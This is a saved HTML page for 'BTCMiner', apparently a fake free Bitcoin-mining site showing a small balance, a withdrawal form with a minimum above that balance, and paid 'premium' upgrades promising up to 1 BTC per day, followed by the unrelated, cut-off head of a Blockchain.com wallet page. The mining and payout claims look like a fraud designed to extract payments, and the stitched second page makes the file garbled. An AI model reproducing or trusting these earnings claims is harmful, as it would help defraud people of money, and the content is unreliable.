<!DOCTYPE html>
<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta charset="utf-8">
<title>BTCMiner - Bitcoin mining. Earn Bitcoin for free.</title>
<meta name="description" content="BTCMiner is a completely automatic Bitcoin miner. Start earning Bitcoin now!">
<meta name="keywords" content="Bitcoin, mining, free">
<meta name="site_referrer" content="20878806">

<meta name="viewport" content="width=device-width,height=device-height" />

<link rel="icon" href="/favicon.ico" type="image/x-icon">
<link href="https://fonts.googleapis.com/css?family=Open+Sans:400,300,600" rel="stylesheet" type="text/css">
<link rel="stylesheet" href="/css/vendor.css?20170717">
<link rel="stylesheet" href="/css/style.css?20170717">
<link rel="manifest" href="/manifest.json">
</head>
<body>
<!-- <script type="text/javascript" src="/js/app.js?v=31"></script> -->

<style type="text/css">
body {
  margin-top:0 !important;
  padding-top:0 !important;
/*  min-width:800px !important; */
  background:#faefe7;
  font-family:"Open Sans",sans-serif !important;
  width:900px;
  margin:0 auto;
}
#popup{
  z-index:100;background:#2390c0;width:900px;min-height:350px;margin-left:0px;position:fixed;top:10px;box-shadow:0 0 20px 0px #000;
  display:none;
  color:#fff;
}
#popup .popbody{
  padding:20px;
}
#popup .popdata{
  padding:20px;
  display:none;
}

#popup .popclose{
  font-size:30px;
  position:absolute;
  top:15px;
  right:20px;
  cursor:pointer;
}
#popup .pophead{
  background:#333;
  font-size:30px;
  padding:20px;
}
.popbody table td img{
transition:0.5s;
}

.popbody table td a{
transition:0.5s;
}

.popbody table td:hover > img {
    box-shadow: 0 0 10px #fff;
}
.popbody table td:hover > small a {
    box-shadow: 0 0 20px #fff;
}

.buybtn{
  /*background:#00547A;*/
  background:#F5A10F;
  padding:7px;
  color:#fff;
  font-weight:bold;
  text-align:center;
  cursor:pointer;
}
.buybtn:hover{
  /*background:#0077AA;*/
  background:#CA5712;
}
.popbody table h1{
  margin:0;
  margin-bottom:5px;
}
#popback{
  position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(1,2,2,0.5);z-index:50;display:none;
}
.embd{
  background:#00547a;border-radius:3px;padding:3px 5px;
}
footer {
    background: #fff;
    border-top: 1px dotted #ca5712;
    border-right:1px dotted #ca5712;
    border-left:1px dotted #ca5712;
    padding: 25px 0;
    width:100%;
}
</style>
<script src="/js/jquery.js"></script>
<script>
function popup(){
  $('#popup').show();
  $('.popbody').show();
  $('.popdata').hide();
  $('#popback').show();
}
function popclose(){
  $('#popup').hide();$('#popback').hide();
}
function sign(){
	if($('[name=addr]').val()){
	        $.post("/",{"task":"sign","addr":$('[name=addr]').val()},
	   		function(data) {
            if(data=='1'){
              //$('.bg_h67').html('Wait...');
              //$('.butm.butm-i').addClass('invis');
              window.location.href='/';
            }else if (data=='0'){
            //$('[name=email]').css('border-color','#cc0000').focus();
            $('#errfield').html('Bitcoin address is invalid! Enter correct wallet address or <a style="color:#fff" href="https://blockchain.info/wallet/#/signup" target="_blank">create new Bitcoin address</a>.');
            }else{
            $('#errfield').html(data);
            }
	   		});
	}else{
      $('#errfield').html('Bitcoin address is invalid! Enter correct wallet address or <a style="color:#fff" href="https://blockchain.info/wallet/#/signup" target="_blank">create new Bitcoin address</a>.');
	}
}

var myVar;

function myFunction(label) {
    myVar = setTimeout(function(){checkpay(label);},10000);
}

function myStopFunction() {
    clearTimeout(myVar);
}

function checkpay(label){
myStopFunction();

$.post( "/", { task: "checkpay", label: label },
function( data ) {

console.log(data);
if(data=='1')window.location.reload();
else myFunction(label);
}
);

}
</script>

<div class="main index">

<header class="header" role="banner">
<div class="container justify">
<div class="logo" style="position:relative">
<a href="/">
<img src="/images/logo_btcminer.png" alt="BTCMiner" height="60">
<!--<b><div style="position:absolute;top:38px;left:69px;font-size:13px;color:#ca5712;white-space:nowrap" id="btcprice">Real Bitcoin Mining</div></b>--></a>
<!--<a href="/payouts"><div style="color: green; position: absolute; white-space:nowrap; left: 69px; z-index: 2; font-size: 12px; top: 45px;">706 BTC payed in 362 days</div></a>-->
</div>
<nav class="nav" role="navigation">
<ul>
<li><a href="/" style="color:#ca5712">BTCMiner</a></li>
<li class=""><a href="/account/">Account</a></li>
<li class=""><a href="/payouts/">Payouts <sup style="color:#00cc00">NEW</sup></a></li>
<li class=""><a href="/contest/">Contest <sup style="color:#cc0000">HOT</sup></a></li>
<li class=""><a href="/faq/">FAQ</a></li>
<!-- <li><a href="https://www.btcgenerator.io/" style="color:#ca5712">BTC Gen</a></li> -->
<!-- <li><a href="https://faucet.wefinex.org/" style="color:#ca5712">BTC Faucet</a></li> -->
<li class=""><a href="/contact/">Contacts</a></li>
<!--<li><a href="/?logout">Logout</a></li>-->
</ul>
</nav>
</div>
</header>
<div class="container table maincontent"  style="position:relative;min-height:600px">
<main role="main">
<div id="errfield" style="padding: 15px 35px;background: #00547a;  color: rgb(255, 255, 255); font-size: 14px;position:relative">
	BTCMiner members already received
    <img src="/images/btcroll.gif" style="vertical-align:-3px">
	<b><a href="/payouts/" style="color:white">	58.69193460</a></b> Bitcoins since launch <b>26</b> days ago (Update daily).
</div>
<form onsubmit="return(false)" style="z-index:1;position:relative">
	<div class="buttons">
		<div id="btnform">
			<div style="font-size:22px;color:#fff;width:40%;display:inline-block;padding-top:5px">
				<div>Balance <sup id="supa" style="font-weight:bold;color: rgb(240, 230, 123); display: none;"></sup></div><b>0.00004879</b> BTC
			</div>
			<button class="withdraw" type="submit" style="float:right" onclick="window.location='/account/'">Account</button>
			<button class="deposit" type="submit" style="float:right" onclick="$('#btnform').hide();$('#widthform').show()">Withdraw</button>
		</div>
		<div id="widthform" style="display:none">
			<div style="font-size:22px;color:#fff;width:50%;display:inline-block;padding-top:5px;">
				<input style="color:#218ab8;padding:5px;border:none;font-size:12px;border:2px solid #5bcdff" size="10" placeholder="Enter amount" id="widthsum" value="0.00004879">
				<small id="widtherr" style="font-size:12px;line-height:14px;white-space:nowrap">
                	Min <a href="javascript:void(0)" style="color:#fff" onclick="$('#widthsum').val('0.005')">0.005</a> BTC,
                    Max <a href="javascript:void(0)" style="color:#fff" onclick="$('#widthsum').val('0.00004879')">0.00004879</a><br>
                    To: <b>bc1qttldscl30qj4et00jpkcskdh4nnjmjc</b>
				</small>
			</div>
			<button class="withdraw" type="submit" style="float:right" onclick="$('#btnform').show();$('#widthform').hide();window.location='/'">Cancel</button>
			<button class="deposit" type="submit" style="float:right" onclick="withdraw()">Confirm</button>
		</div>
	</div>
	<div class="button">
		<button type="submit" class="btn-login" onclick="window.location='/?task=logout'">Logout</button>
	</div>
</form>

<script>
var curlev=0;
var lev=0;
function sato(){
var un=Math.round(Math.random() * 10000);
  var date = new Date();
  date.setTime(date.getTime()+(30*200));
}
sato();
var ssato=setInterval(function(){
  sato();
},3000);
</script>

<div class="mainblock" style="margin:32px 0 0px">
	<div class="image" style="float:left;position:relative;margin-top:-95px;z-index:-1;margin-left:0;margin-right:40px">
	<iframe frameborder="0" width="270" height="480" src="/popup/"></iframe>
</div>
<div class="mining" style="float:right;width:585px;min-height:275px;margin-top:-18px">
	<h1>BTCMiner v1.0 <sup style="color:#00cc00;font-weight:normal">Free</sup></h1>
	<div class="text">
		<div style="width:250px;float:left">Profit per minute<b style="display:block">40 Satoshi</b></div>
		<div style="width:250px;float:right">Profit per day<b style="display:block">0,0006 Bitcoin</b></div><div style="clear:both"></div>
	</div>
	<div class="lifetime" id="nopl" style="display:block">
		<button class="levelup" onclick="$('html, body').animate({ scrollTop: $('.content-plans h3').offset().top }, 'slow');" style="margin:0 0 20px 0;box-shadow:none">Upgrade BTCMiner</button>
		<div class="reflink" style="padding:22px 0;box-shadow:5px 7px 0 rgba(7, 6, 4, 0.75);box-shadow:none"><a href="/account/" style="text-decoration:none">
        	<div class="title copytext" style="font-size:36px">Go to Account</div></a>
		</div>
	</div>
</div>
<br style="clear:both" />

<br style="clear:both" />
<br style="clear:both" />

<div class="content-plans">
<h3>Upgrade BTCMiner to premium</h3>
<h4>Choose premium version below to increase your affiliate program bonus and earn much more!</h4>
<div class=plan onclick="upgrade(1);popup();"><br><img height="260" src="/images/l1.png"><h4>Version 1.1</h4>
<p>
Earning rate <b>x2</b><br><b>80 Sato</b> per minute<br><b>0.0012 BTC</b> per day
</p>
<div class="bonus"><h5><img src="/images/check.png"> Affiliate bonus <b style="color:#f5a10f">20%</b></h5></div>
<a class="plan-button" id="buyy1"><script>setInterval(function () {$("#buyy1x").css("background-color", "#f5a10f");setTimeout(function () {$("#buyy1x").css("background-color", "red");}, 150);}, 300);</script>Buy for 0.0019 BTC</a></div>
<div class="plan" onclick="upgrade(2);popup();">
<img src="/images/10-off.png" class="off"><br>
<img height="260" src="/images/l2.png"><h4>Version 1.2</h4>
<p>
Earning rate <b>x25</b><br><b>1000 Sato</b> per minute<br><b>0.015 BTC</b> per day
</p>
<div class="bonus"><h5><img src="/images/check.png"> Affiliate bonus <b style="color:#f5a10f">30%</b></h5></div><a class="plan-button" id="buyy2"><script>setInterval(function () {$("#buyy2x").css("background-color", "#f5a10f");setTimeout(function () {$("#buyy2x").css("background-color", "red");}, 150);}, 300);</script>Buy for 0.0090 BTC</a></div>
<div class="plan" onclick="upgrade(3);popup();">
<img src="/images/20-off.png" class="off"><br>
<img height="260" src="/images/l3.png"><h4>Version 1.3</h4>
<p>
Earning rate <b>x250</b><br><b>10000 Sato</b> per minute<br><b>0.15 BTC</b> per day
</p>
<div class="bonus"><h5><img src="/images/check.png"> Affiliate bonus <b style="color:#f5a10f">40%</b></h5></div>
<a class="plan-button" id="buyy3"><script>setInterval(function () {$("#buyy3x").css("background-color", "#f5a10f");setTimeout(function () {$("#buyy3x").css("background-color", "red");}, 100);}, 200);</script>Buy for 0.0800 BTC</a></div>
<div class="plan" onclick="upgrade(4);popup();" style="margin-right:0">
<img src="/images/30-off.png" class="off"><br>
<img height="260" src="/images/l4.png"><h4>Version 1.4</h4>
<p>
Earning rate <b>x1750</b><br><b>70000 Sato</b> per minute<br><b>1 BTC</b> per day
</p>
<div class="bonus"><h5><img src="/images/check.png"> Affiliate bonus <b style="color:#f5a10f">50%</b></h5></div>
<!--<b><u>Instant withdrawals</u></b>--><a class="plan-button"  id="buyy4"><script>setInterval(function () {$("#buyy4x").css("background-color", "#f5a10f");setTimeout(function () {$("#buyy4x").css("background-color", "red");}, 150);}, 300);</script>Buy for 0.5000 BTC</a></div>
</div><br style="clear:both" />
<style>
.plan {
    background: #fff none repeat scroll 0 0;
    border: 1px solid #eeeeee;
    border-radius: 6px;
    cursor: pointer;
    float: left;
    height: 590px;
    /*margin-bottom: 60px;*/
    margin-right: 10px;
/*    padding-top: 40px;*/
    text-align: center;
    width: 215px;
    position:relative;
    color:#555;
}
.plan-button {
    background: #f7941e none repeat scroll 0 0;
    border: medium none;
    border-radius: 4px;
    color: #fff;
    cursor: pointer;
    font-family: "Open Sans",sans-serif;
    font-size: 16px;
    font-weight: bold;
    padding: 15px 25px;
    margin-top:5px;
    text-align: center;
    text-decoration: none;
    text-transform: uppercase;
}
.plan-button:hover{
  background:#ea6808 none repeat scroll 0 0;
}

.plan p{
  padding-top:12px;
  margin:0;
}
.plan h5 {
    padding-bottom:10px;
}
.content-plans h4 {
    font-size: 18px;
    font-weight: normal;
    padding-bottom: 30px;
    margin:0;
}

.content-plans h3 {
    font-size: 34px;
    padding-bottom: 10px;
    margin:0;
    color:#218ab8;
}
.content-plans {
    text-align: center;
}
.best-deal {
    border: 1px solid #f7941e !important;
}
.plan h4 {
    border-bottom: 1px solid #eaeaea;
    color:#218ab8;
    font-size: 18px;
    margin: 0 30px;
    padding: 25px 0 20px;
    text-transform: uppercase;
}
.plan:hover{
  border:1px solid #f7941e;
}

.bonus {
    border-top: 1px solid #eaeaea;
    margin: 15px 30px 0;
}

.plan h5 img {
    float: left;
    padding: 1px 5px 0 0;
    width: 18px;
}

img.off {
    float: right;
    margin: 0 auto;
    position: absolute;
    right: -5px;
    top: -5px;
    width: 150px;
    z-index: 1;
}
</style>



</div>
<!--<div id="popup" style="width:900px;margin-left:0px;">
<div class="popclose" onclick="popclose()">&#10005;</div>
<div class="pophead">Upgrade BTCMiner to Premium</div>
<div class="popbody">
 Upgrade your BTCMiner v1.0 to v1.1 to earn even more and increase affiliate program bonus. Choose version v1.1 below.<br><br>
<table border=0>
<tr>
<td width=240 valign="top"><img width="220" style="padding-top:6px" src="/images/mining4.gif"></td>
<td width=160 valign="top"><h1>v1.1</h1><small><b>Earning rate:</b><br>0.0000008 BTC/min<br><b>0.0012 BTC</b> per day<br><br>Affiliate bonus <b style="color:#cc0000">20%</b><div style="margin-top:15px"><a class="buybtn" id="buyy1" onclick="upgrade(1);$(this).hide();setTimeout(function(){$('#buyy1').show()},10000)"><img src="/s/btcroll.gif" style="vertical-align:-4px"> Buy for 0.01 BTC</a><br><h3>Ready to upgrade</h3><br></div></small></td>

<td width=160 valign="top"><h1>v1.2</h1><small><b>Earning rate:</b><br>0.00001 BTC/min<br><b>0.015 BTC</b> per day<br><br>Affiliate bonus <b style="color:#cc0000">30%</b><div style="margin-top:15px"><a class="buybtn" id="buyy2" onclick="upgrade(2);$(this).hide();setTimeout(function(){$('#buyy2').show()},10000)" style="background:#00547A;cursor:default">Price 0.1 BTC</a><br><br><small>*Requires v1.1 installed</small></div></small></td>

<td width=160 valign="top"><h1>v1.3</h1><small><b>Earning rate:</b><br>0.0001 BTC/min<br><b>0.15 BTC</b> per day<br><br>Affiliate bonus <b style="color:#cc0000">40%</b><div style="margin-top:15px"><a class="buybtn" id="buyy3" onclick="upgrade(3);$(this).hide();setTimeout(function(){$('#buyy3').show()},10000)" style="background:#00547A;cursor:default">Price 0.9 BTC</a><br><br><small>*Requires v1.2 installed</small></div></small></td>

<td width=140 valign="top"><h1>v1.4</h1><small><b>Earning rate:</b><br>0.0007 BTC/min<br><b>1 BTC</b> per day<br>Affiliate bonus <b style="color:#cc0000">50%</b><br><b><u>Instant withdrawals</u></b><div style="margin-top:15px"><a class="buybtn" id="buyy4" onclick="upgrade(4);$(this).hide();setTimeout(function(){$('#buyy4').show()},10000)" style="background:#00547A;cursor:default">Price 5 BTC</a><br><br><small>*Requires v1.3 installed</small></div></small></td>
</tr>
</table>
</div>
<div class="popdata"></div>
</div>-->
<div id="popup">
<div class="popclose" onclick="popclose()">&#10005;</div>
<div class="pophead" style="font-size:25px">Upgrade BTCMiner to Premium</div>
<div class="popbody">
Loading...
<!--Upgrade your BTCMiner <b>V1.0</b> to earn even more and increase affiliate program bonus.<br><br>
<table border=0>
<tr>
<td width=170 valign="top" style="text-align:center"><h1>V1.1</h1><img height="210" src="/images/l1.png"><br><small><b>Earning rate:</b><br>0.0000008 BTC/min<br><b>0.0012 BTC</b> per day<br><br>Affiliate bonus <b style="color:#f5a10f">30%</b><div style="margin-top:15px"><a class="buybtn" id="buyy1" onclick="upgrade(1);$(this).hide();setTimeout(function(){$('#buyy1').show()},10000)"><img src="/s/btcroll.gif" style="vertical-align:-4px"> <script>setInterval(function () {$("#buyy1x").css("background-color", "#f5a10f");setTimeout(function () {$("#buyy1x").css("background-color", "red");}, 150);}, 300);</script>Buy for 0.01 BTC</a><br><h3>Upgrade now!</h3></div></small></td>
<td width=60 valign="top"></td>
<td width=170 valign="top" style="text-align:center"><h1>V1.2</h1><img height="210" src="/images/l2.png"><br><small><b>Earning rate:</b><br>0.00001 BTC/min<br><b>0.015 BTC</b> per day<br><br>Affiliate bonus <b style="color:#f5a10f">40%</b><div style="margin-top:15px"><a class="buybtn" id="buyy2" onclick="upgrade(2);$(this).hide();setTimeout(function(){$('#buyy2').show()},10000)"><img src="/s/btcroll.gif" style="vertical-align:-4px"> <script>setInterval(function () {$("#buyy2x").css("background-color", "#f5a10f");setTimeout(function () {$("#buyy2x").css("background-color", "red");}, 150);}, 300);</script>Buy for 0.1 BTC</a><br><h3>Sale 5% off</h3></div></small></td>
<td width=60 valign="top"></td>
<td width=170 valign="top" style="text-align:center"><h1>V1.3</h1><img height="210" src="/images/l3.png"><br><small><b>Earning rate:</b><br>0.0001 BTC/min<br><b>0.15 BTC</b> per day<br><br>Affiliate bonus <b style="color:#f5a10f">50%</b><div style="margin-top:15px"><a class="buybtn" id="buyy3" onclick="upgrade(3);$(this).hide();setTimeout(function(){$('#buyy3').show()},10000)"><img src="/s/btcroll.gif" style="vertical-align:-4px"> <script>setInterval(function () {$("#buyy3x").css("background-color", "#f5a10f");setTimeout(function () {$("#buyy3x").css("background-color", "red");}, 100);}, 200);</script>Buy for 0.9 BTC</a><br><h3>Sale 10% off</h3></div></small></td>
<td width=60 valign="top"></td>
<td width=170 valign="top" style="text-align:center"><h1>V1.4</h1><img height="210" src="/images/l4.png"><br><small><b>Earning rate:</b><br>0.0007 BTC/min<br><b>1 BTC</b> per day<br>Affiliate bonus <b style="color:#f5a10f">100%</b><br><b><u>Instant withdrawals</u></b><div style="margin-top:15px"><a class="buybtn"  id="buyy4" onclick="upgrade(4);$(this).hide();setTimeout(function(){$('#buyy4').show()},10000)"><img src="/s/btcroll.gif" style="vertical-align:-4px"> <script>setInterval(function () {$("#buyy4x").css("background-color", "#f5a10f");setTimeout(function () {$("#buyy4x").css("background-color", "red");}, 150);}, 300);</script>Buy for 5 BTC</a><br><h3>Sale 20% off</h3></div></small></td>
</tr>
</table>-->
</div>
<div class="popdata"></div>
</div>



<script>
/*
function getTimeRemaining(endtime) {
	  var t = Date.parse(endtime) - Date.parse(new Date());
	 // alert(t);
	  var seconds = Math.floor((t / 1000) % 60);
	  var minutes = Math.floor((t / 1000 / 60) % 60);
	  var hours = Math.floor((t / (1000 * 60 * 60)) % 24);
	  var days = Math.floor(t / (1000 * 60 * 60 * 24));
	  return {
		'total': t,
		'days': days,
		'hours': hours,
		'minutes': minutes,
		'seconds': seconds
	  };
	}

	function initializeClock(id, endtime) {
	  var clock = document.getElementById(id);
	 // var daysSpan = clock.querySelector('.days');
	  var hoursSpan = clock.querySelector('.hours');
	  var minutesSpan = clock.querySelector('.minutes');
	  var secondsSpan = clock.querySelector('.seconds');

	  function updateClock() {
		var t = getTimeRemaining(endtime);

	  //  daysSpan.innerHTML = t.days;
		hoursSpan.innerHTML = ('0' + t.hours).slice(-2);
		minutesSpan.innerHTML = ('0' + t.minutes).slice(-2);
		secondsSpan.innerHTML = ('0' + t.seconds).slice(-2);

		if (t.total <= 0) {
		  clearInterval(timeinterval);
		  window.location='';
		}
	  }

	  updateClock();
	  var timeinterval = setInterval(updateClock, 1000);
	}
			var deadline = new Date(Date.parse(new Date()) + -454221000 );
		initializeClock('popup', deadline);
*/
function upgrade(level){
	        $.post("",{"task":"upgrade","level":level},
	   		function(data) {
	   		  //$('.pophead').html('Upgrade');
            $('.popbody').hide();
            $('.popdata').show().html(data);
	   		});
	}
    function withdraw(){
      clearInterval(ssato);
      $('#widtherr').text('Confirming withdrawal...');
      $('.deposit').hide();
      $('.image iframe').remove()
	        $.post("",{"task":"withdraw","amount":$('#widthsum').val()},
	   		function(data) {
	   		  if(data==1){
	   		    $('#widtherr').html('Your withdrawal is confirmed!');
                //.reload();
	   		    setTimeout(function(){window.location='/account/?withdraw'},2000);
              }else{
            $('#widtherr').text(data);
            }
            //$('.deposit').show();
	   		});
	}

function changewl(){
	        $.post("",{"task":"changewl","addr":$('#changewl').val()},
	   		function(data) {
	   		    if(data==1){
	   		    $('#changewlmsg').html('Your wallet address confirmed!');
	   		    setTimeout(function(){window.location.reload();},2000);
              }else{
                $('#changewlmsg').html(data);
                }
	   		});
	}
	
	$(document).ready(function(){
      //popup();
	  if (window.location.href.indexOf("?upgrade")> 0)
	      $("html, body").animate({ scrollTop: $('.content-plans h3').offset().top }, "slow");
    });
    
        var pl=false;
//if(!pl)$('#nopl').fadeIn();
//if(pl)$('.#yespl').fadeIn();
</script>
<div class="content-plans">
<h3>STAY IN THE KNOW</h3>
<h4>Get special newsletter member discounts and lots of inspiration.</h4>
<form style="z-index:1;position:relative" action="https://app.getresponse.com/add_subscriber.html" accept-charset="utf-8" method="post">
	<input type="hidden" name="campaign_token" value="QxulW" />
    <div class="input">
    	<table border="1" bordercolor="#2390c0">
        	<tr>
            	<!-- Name -->
	            <td><input placeholder="Your Name" type="text" name="name"/></td>
				<!-- Email field (required) -->
    	        <td><input placeholder="Your Email" type="text" name="email"/></td>
            </tr>
        </table>
	</div>
	<!-- List token -->
	<!-- Get the token at: https://app.getresponse.com/campaign_list.html -->
	<!-- Subscriber button -->
    <div class="button">
		<button type="submit" class="btn-login" value="Subscribe">Subscribe</button>
	</div>
</form>
</div>


<div id="google_translate_element" style="position:absolute;top:-15px;right:0"></div><script type="text/javascript">
function googleTranslateElementInit() {
  new google.translate.TranslateElement({pageLanguage: 'en', autoDisplay: false,layout: google.translate.TranslateElement.InlineLayout.SIMPLE, gaTrack: true, gaId: 'UA-81127201-1'}, 'google_translate_element');
}
</script><script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
</main>
</div>
</div>
<div onclick="popclose()" id="popback"></div>
<footer>
<div class="container" style="position:relative">
<center>
<a href="https://bitcoin.com" target="_blank"><img src="/images/bitlogo2.png" alt=""  height=30/></a> &nbsp; &nbsp;
<a href="https://blockchain.info" target="_blank"><img src="/images/logobc.png" alt=""  height=30/></a>
<a href="https://coinbase.com" target="_blank"><img src="/images/cblogo.png" alt=""  height=30/></a>
<a href="https://localbitcoins.com" target="_blank"><img src="/images/lbitlogo.png" alt=""  height=30/></a>
</center>
<center><small style="color:#999">© BTCMiner Gold EU LTD, 2016-2022</small></center>
</div>
</footer>
<script>
  function btcprice(flash){
  $.ajax({
            type: "GET",
            url: "https://rushwallet.com/ticker2.php",
            async: true,
            data: {},
            dataType: "json"

        }).done(function (msg) {


            price = msg['USD'].last;


            price = price.toFixed(2);

            if(flash)$("#btcprice").html('1 BTC = '+price+' USD').hide().fadeIn(200);
            else $("#btcprice").html('1 BTC = '+price+' USD');


        });
  }
  //btcprice(1);
  //setInterval(function(){btcprice()},30000);
</script>
<!-- Histats.com  TAG-->
<script>
if(!Histats_variables){var Histats_variables=[];}
Histats_variables.push("tags","site_btc");
Histats_variables.push("tags","BTCMiner");
Histats_variables.push("site","www.btcminer.gold");
</script>
<!-- Histats.com  TAG END-->

<!-- Histats.com  START  (aync)-->
<script type="text/javascript">var _Hasync= _Hasync|| [];
_Hasync.push(['Histats.start', '1,3859477,4,0,0,0,00010000']);
_Hasync.push(['Histats.fasi', '1']);
_Hasync.push(['Histats.track_hits', '']);
(function() {
var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
hs.src = ('//s10.histats.com/js15_as.js');
(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
})();</script>
<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?3859477&101" alt="website statistics" border="0"></a></noscript>
<!-- Histats.com  END  -->

<!--0.00000000 0.00000000-->
</body></html>
<!doctype html><html><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="description" content="Discover the world's most popular bitcoin wallet. Visit today to create your free simple, secure and safe Blockchain Wallet."><meta name="keywords" content="bitcoin wallet, blockchain wallet, online bitcoin wallet, bitcoin wallet online"><title>Blockchain.com Wallet - Exchange Cryptocurrency</title><link rel="manifest" href="./manifest.webmanifest"/><script nonce="WWzntbmoXGTc6f56FITiweAAXJgMlAIP">window.NONCE = 'WWzntbmoXGTc6f56FITiweAAXJgMlAIP'</script><style nonce="WWzntbmoXGTc6f56FITiweAAXJgMlAIP">html, body, #app, #app > div {padding: 0; margin: 0; height: 100%;}
			html, body {overflow: hidden;}
			/* hide scrollbars */
			::-webkit-scrollbar {
				display: none;
			}
			* {
				scrollbar-width: none;
				-ms-overflow-style: none;
				-webkit-font-smoothing: antialiased;
			}</style><link rel="shortcut icon" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/favicon.ico"><link rel="icon" type="image/png" sizes="16x16" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/favicon-16x16.png"><link rel="icon" type="image/png" sizes="32x32" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/favicon-32x32.png"><link rel="icon" type="image/png" sizes="48x48" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/favicon-48x48.png"><link rel="manifest" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/manifest.json"><meta name="mobile-web-app-capable" content="yes"><meta name="theme-color" content="#fff"><meta name="application-name" content="blockchain-wallet-v4-frontend"><link rel="apple-touch-icon" sizes="57x57" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/apple-touch-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/apple-touch-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/apple-touch-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/apple-touch-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/apple-touch-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/apple-touch-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/apple-touch-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/apple-touch-icon-152x152.png"><link rel="apple-touch-icon" sizes="167x167" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/apple-touch-icon-167x167.png"><link rel="apple-touch-icon" sizes="180x180" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/apple-touch-icon-180x180.png"><link rel="apple-touch-icon" sizes="1024x1024" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/apple-touch-icon-1024x1024.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="apple-mobile-web-app-title" content="blockchain-wallet-v4-frontend"><link rel="apple-touch-startup-image" media="(device-width: 320px) and (device-height: 568px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/apple-touch-startup-image-640x1136.png"><link rel="apple-touch-startup-image" media="(device-width: 375px) and (device-height: 667px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/apple-touch-startup-image-750x1334.png"><link rel="apple-touch-startup-image" media="(device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/apple-touch-startup-image-828x1792.png"><link rel="apple-touch-startup-image" media="(device-width: 375px) and (device-height: 812px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/apple-touch-startup-image-1125x2436.png"><link rel="apple-touch-startup-image" media="(device-width: 414px) and (device-height: 736px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/apple-touch-startup-image-1242x2208.png"><link rel="apple-touch-startup-image" media="(device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/apple-touch-startup-image-1242x2688.png"><link rel="apple-touch-startup-image" media="(device-width: 768px) and (device-height: 1024px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/apple-touch-startup-image-1536x2048.png"><link rel="apple-touch-startup-image" media="(device-width: 834px) and (device-height: 1112px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/apple-touch-startup-image-1668x2224.png"><link rel="apple-touch-startup-image" media="(device-width: 834px) and (device-height: 1194px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/apple-touch-startup-image-1668x2388.png"><link rel="apple-touch-startup-image" media="(device-width: 1024px) and (device-height: 1366px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/apple-touch-startup-image-2048x2732.png"><link rel="apple-touch-startup-image" media="(device-width: 810px) and (device-height: 1080px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/apple-touch-startup-image-1620x2160.png"><link rel="apple-touch-startup-image" media="(device-width: 320px) and (device-height: 568px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/apple-touch-startup-image-1136x640.png"><link rel="apple-touch-startup-image" media="(device-width: 375px) and (device-height: 667px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/apple-touch-startup-image-1334x750.png"><link rel="apple-touch-startup-image" media="(device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)" href="/img/favicons-f0224ca0aabf1aa42bf7e103b6f0a306/apple-touch-startup-image-1792x828.png"><link rel="apple-touch-startup-image" media="(device-width: 375px) and (device-height: 812px) and (-webkit-device-pixel-ratio: 3) and (orientation: 